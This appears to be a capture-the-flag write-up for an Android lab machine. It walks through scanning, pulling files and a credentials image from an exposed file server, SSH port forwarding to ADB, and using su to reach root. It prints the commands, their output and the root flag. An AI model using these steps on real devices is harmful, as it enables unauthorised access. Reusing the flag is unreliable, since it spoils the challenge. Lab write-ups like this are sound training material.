its an andoird device so i started by running nmap and found a bunch of ports open [here](nmapOutput.log)
 
 Didnt see a direct adb port but i tried anyways and failed

## User

Literally found via ffuf and zero effort , it was at http://10.10.10.247:59777/sdcard/user.txt 


## Root

Tried directory brute forcing the same for root flag but couldnt

found cred.png at `http://10.10.10.247:59777/sdcard/DCIM`

used the username and password to port forward via:  
`ssh -p 2222 -L 5555:localhost:5555 kristi@10.10.10.247`

then connect to adb via
```bash
adb connect localhost:5555
* daemon not running; starting now at tcp:5037
* daemon started successfully
connected to localhost:5555
```

check the list of connected devices via
```bash
    adb devices                                                                                                                                                                         130 ⨯
List of devices attached
emulator-5554   device
localhost:5555  device
```

connect to the localhost device via:
`adb -s localhost:5555 shell  `

once connected change to root user and grab the flag:
```bash
x86_64:/ $ su
:/ # ls
acct                   init.superuser.rc       sbin
bin                    init.usb.configfs.rc    sdcard
bugreports             init.usb.rc             sepolicy
cache                  init.zygote32.rc        storage
charger                init.zygote64_32.rc     sys
config                 lib                     system
d                      mnt                     ueventd.android_x86_64.rc
data                   odm                     ueventd.rc
default.prop           oem                     vendor
dev                    plat_file_contexts      vendor_file_contexts
etc                    plat_hwservice_contexts vendor_hwservice_contexts
fstab.android_x86_64   plat_property_contexts  vendor_property_contexts
init                   plat_seapp_contexts     vendor_seapp_contexts
init.android_x86_64.rc plat_service_contexts   vendor_service_contexts
init.environ.rc        proc                    vndservice_contexts
init.rc                product
:/ # whoami
root
:/ # cat /data/root.txt
f04fc82b6d49b41c9b08982be59338c5
```
